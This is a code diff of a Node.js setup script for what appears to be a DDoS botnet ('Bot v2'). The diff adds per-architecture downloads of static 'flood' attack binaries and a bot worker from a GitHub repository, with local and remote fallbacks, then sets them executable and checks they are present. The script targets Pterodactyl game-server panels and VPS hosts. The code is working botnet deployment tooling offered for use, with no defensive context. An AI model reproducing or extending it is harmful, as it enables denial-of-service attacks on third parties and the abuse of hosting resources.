@@ -1,16 +1,27 @@
 /**
  * Bot v2 Setup Script - Pure Node.js (Pterodactyl & VPS Compatible)
- * Downloads or copies lightweight C++ flood (< 100 KB) & bot worker.
- * Connects directly to Agent v2 unified single port.
+ * Downloads fully-static flood binaries (musl, TLS-enabled) for ALL devices
+ * plus the bot worker. No glibc/GLIBCXX dependency at runtime.
  */
 
 const https = require('https');
 const http  = require('http');
+const os    = require('os');
 const fs    = require('fs');
 const path  = require('path');
 const { spawn } = require('child_process');
 
 const REPO_BASE = 'https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main';
+
+// Map Node arch -> our static flood binary suffix
+const ARCH_MAP = {
+    x64:   'x86_64',
+    arm64: 'aarch64',
+    arm:   'armv7l',
+    ia32:  'x86',
+    ppc64: 'x86_64', // fallback
+    s390x: 'x86_64', // fallback
+};
 
 const FILES_TO_DOWNLOAD = [
     { url: `${REPO_BASE}/bots/bot`,       filename: 'bot',       executable: true  },
@@ -41,33 +52,77 @@ function download(url, destPath) {
 async function setup() {
     const targetDir = process.cwd();
     console.log(`[+] Setting up Bot v2 in: ${targetDir}`);
+    console.log(`[+] Platform: ${os.platform()} arch: ${os.arch()}`);
 
-    // Check local lightweight flood first from methods_cpp
-    const localFlood = path.join(__dirname, '..', 'methods_cpp', 'flood');
+    const binArch   = ARCH_MAP[os.arch()] || 'x86_64';
+    const localDir  = path.join(__dirname, '..');
     const targetFlood = path.join(targetDir, 'flood');
 
-    if (fs.existsSync(localFlood)) {
-        console.log('[*] Using local lightweight C++ flood binary...');
-        fs.copyFileSync(localFlood, targetFlood);
-        fs.chmodSync(targetFlood, 0o755);
-    } else if (!fs.existsSync(targetFlood)) {
-        try {
-            process.stdout.write(`[*] Downloading flood binary... `);
-            await download(`${REPO_BASE}/bots/flood?t=${Date.now()}`, targetFlood);
-            fs.chmodSync(targetFlood, 0o755);
-            console.log('OK');
-        } catch (err) {
-            console.log('FAILED');
-            console.error(`[!] Failed to download flood: ${err.message}`);
+    // ---- arch-specific static bot ----
+    const botItem = { url: `${REPO_BASE}/bots/bot-${binArch}`, filename: 'bot', executable: true };
+    const localBot = path.join(localDir, 'bots', `bot-${binArch}`);
+    if (fs.existsSync(localBot)) {
+        fs.copyFileSync(localBot, path.join(targetDir, 'bot'));
+        fs.chmodSync(path.join(targetDir, 'bot'), 0o755);
+        console.log(`[*] Copied local static bot (${binArch})...`);
+    } else {
+        const destBot = path.join(targetDir, 'bot');
+        if (!fs.existsSync(destBot)) {
+            try {
+                process.stdout.write(`[*] Downloading static bot (${binArch})... `);
+                await download(`${botItem.url}?t=${Date.now()}`, destBot);
+                fs.chmodSync(destBot, 0o755);
+                console.log('OK');
+            } catch (err) {
+                console.log(`[!] Arch bot unavailable (${err.message}); will try generic bot later.`);
+            }
         }
     }
 
-    // Check or download bot & agent.txt
+    // ---- flood (fully static) ----
+    const localStatic = path.join(localDir, 'methods_cpp', `flood-${binArch}`);
+    const localPlain  = path.join(localDir, 'methods_cpp', 'flood');
+
+    let floodOk = false;
+    if (fs.existsSync(localStatic)) {
+        console.log(`[*] Using local static flood (${binArch}) from methods_cpp...`);
+        fs.copyFileSync(localStatic, targetFlood);
+        fs.chmodSync(targetFlood, 0o755);
+        floodOk = true;
+    } else {
+        // Try remote static flood
+        try {
+            process.stdout.write(`[*] Downloading static flood (${binArch})... `);
+            await download(`${REPO_BASE}/methods_cpp/flood-${binArch}?t=${Date.now()}`, targetFlood);
+            fs.chmodSync(targetFlood, 0o755);
+            console.log('OK');
+            floodOk = true;
+        } catch (err) {
+            console.log('FAILED');
+            console.error(`[!] Static flood ${binArch} not available: ${err.message}`);
+        }
+    }
+
+    if (!floodOk && fs.existsSync(localPlain)) {
+        console.log('[*] Falling back to local (dynamic) flood binary...');
+        fs.copyFileSync(localPlain, targetFlood);
+        fs.chmodSync(targetFlood, 0o755);
+        floodOk = true;
+    } else if (!floodOk && !fs.existsSync(targetFlood)) {
+        try {
+            console.log('[*] Trying generic dynamic flood fallback...');
+            await download(`${REPO_BASE}/bots/flood?t=${Date.now()}`, targetFlood);
+            fs.chmodSync(targetFlood, 0o755);
+        } catch (err) {
+            console.error(`[!] All flood download attempts failed: ${err.message}`);
+        }
+    }
+
+    // ---- bot (generic fallback) + agent.txt ----
     for (const item of FILES_TO_DOWNLOAD) {
         const dest = path.join(targetDir, item.filename);
         if (!fs.existsSync(dest)) {
-            // Check if available locally
-            const localFile = path.join(__dirname, '..', item.filename === 'bot' ? 'bots/bot' : item.filename);
+            const localFile = path.join(localDir, item.filename === 'bot' ? 'bots/bot' : item.filename);
             if (fs.existsSync(localFile)) {
                 fs.copyFileSync(localFile, dest);
                 if (item.executable) fs.chmodSync(dest, 0o755);
@@ -93,6 +148,10 @@ async function setup() {
     const botBin = path.join(targetDir, 'bot');
     if (!fs.existsSync(botBin)) {
         console.error('[-] Bot binary not found, aborting.');
+        process.exit(1);
+    }
+    if (!fs.existsSync(targetFlood)) {
+        console.error('[-] flood binary not found, aborting.');
         process.exit(1);
     }
 
